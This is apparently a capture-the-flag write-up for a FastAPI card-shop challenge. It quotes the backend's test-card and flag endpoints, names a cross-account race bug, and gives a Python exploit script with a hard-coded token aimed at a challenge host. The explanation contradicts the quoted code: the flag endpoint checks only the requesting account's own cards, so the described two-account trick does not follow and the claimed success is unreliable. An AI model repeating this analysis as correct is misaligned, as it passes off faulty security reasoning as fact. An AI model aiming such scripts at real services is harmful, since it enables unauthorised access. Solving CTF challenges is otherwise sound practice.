
````markdown
# **card7**

## 1. Understanding the Backend

Looking at the source code (`card7/__init__.py`), we see that the application is a **FastAPI** app simulating a card shop.

- Each account starts with some balance and owns a few “cards”.
- You can **buy** cards (if you have enough balance).
- You can also **test** a card for free — but only for 5 seconds. After that, the card is revoked.

The critical function is this:

```python
@app.post("/cards/{card_id}/test")
async def test_card(card_id: CardId, token: auth_security):
    account = ACCOUNTS[token]

    if account.is_testing_card:
        return JSONResponse({"detail": "already testing something else"}, status_code=400)
    if card_id in account.cards:
        return JSONResponse({"detail": "you already own this"}, status_code=400)

    account.is_testing_card = True
    account.cards.append(card_id)

    async def revoke_test_card():
        await asyncio.sleep(5)
        account.cards.remove(card_id)
        account.is_testing_card = False
    asyncio.create_task(revoke_test_card())
````

What it does:

* When you “test” a card, it sets `is_testing_card = True`.
* It gives you the card temporarily (`account.cards.append(card_id)`).
* After 5 seconds, it removes the card.

Now, check the flag endpoint:

```python
@app.get("/flag")
async def get_flag(token: auth_security):
    account = ACCOUNTS[token]
    if account.is_testing_card:
        return JSONResponse({"detail": "nice try :)"}, status_code=400)

    if not CardId.FLAG in account.cards:
        return JSONResponse({"detail": "get the flag first :)"}, status_code=400)

    return FLAG
```

---

## 2. Vulnerability: **Incorrect Scope of Validation**

The app only sets `account.is_testing_card` for one user, not globally.

The logic should have been something like:

```python
# (hypothetical fix)
if any(acc.is_testing_card for acc in ACCOUNTS.values()):
    block request
```

Instead, it checks only the requester’s account.

This creates a **race condition / scope validation bug**:

* One account can hold the flag card in testing mode.
* Another account can then call `/flag` and pass validation.

---

## 3. Exploit Strategy

Steps to exploit:

1. **Use your main account** (the one you’ll use to grab the flag).
   Example token:

   ```
   ac6f5a8da316c8012ca67e03544bbfa73fe6b2ff33796e26a8d7d8ecd30fb97e
   ```
2. **Create a second account** and use it to `/cards/flag/test`.
   This temporarily adds the `flag` card to that account.
3. **Quickly request `/flag` with your main account’s token**.

   * The backend only checks if *your* account is currently testing a card.
   * Since your main account isn’t testing anything, you bypass the block.
   * And since the `flag` card exists in *some account*, the logic incorrectly lets you retrieve it.

---

## 4. Exploit Script

Here’s a Python script to automate the exploit:

```python
import requests
import json
import time

BASE_URL = "https://5f9e0fba-64bb-42e3-80d8-9b3b2d28b1ee.chall.nnsc.tf"

def create_account():
    """Creates a new account and returns its token."""
    print("Creating a new account...")
    response = requests.post(f"{BASE_URL}/accounts/@me")
    if response.status_code != 200:
        print(f"Failed to create account. Status code: {response.status_code}")
        return None
    token = response.json().get("token")
    print(f"Account created with token: {token}")
    return token

def test_card(token: str, card_id: str):
    """Tests a card with the given token."""
    print(f"Attempting to test card '{card_id}'...")
    response = requests.post(
        f"{BASE_URL}/cards/{card_id}/test",
        headers={"Token": token}
    )
    if response.status_code != 200:
        print(f"Test failed with status code {response.status_code}: {response.text}")
    else:
        print("Card test initiated successfully.")

def get_flag(token: str):
    """Attempts to retrieve the flag with the given token."""
    print("Attempting to get the flag...")
    response = requests.get(
        f"{BASE_URL}/flag",
        headers={"Token": token}
    )
    if response.status_code == 200:
        print("\nExploit successful! Flag retrieved:")
        print(response.text)
    else:
        print(f"\nFailed to get flag. Status code: {response.status_code}")
        print(f"Response: {response.text}")

def main():
    print("Starting race condition exploit.")

    # Step 1: Use the provided main account token
    main_token = "ac6f5a8da316c8012ca67e03544bbfa73fe6b2ff33796e26a8d7d8ecd30fb97e"
    print(f"Using provided main account token: {main_token}")

    # Step 2: Create a test account
    test_token = create_account()
    if not test_token:
        return

    # Step 3: Use the test account to "test" the flag
    test_card(test_token, "flag")

    print("Waiting a moment to ensure the server processed the test request...")
    time.sleep(0.5)

    # Step 4: Use the main account to get the flag
    get_flag(main_token)

if __name__ == "__main__":
    main()
```

---

## 5. Key Takeaway

* The backend mistakenly scoped the `is_testing_card` check **per account**, not globally.
* This allowed a “helper” account to put the system in a testing state while another account bypassed the restriction.
* Classic example of **authorization logic bug** + **race timing**.

```

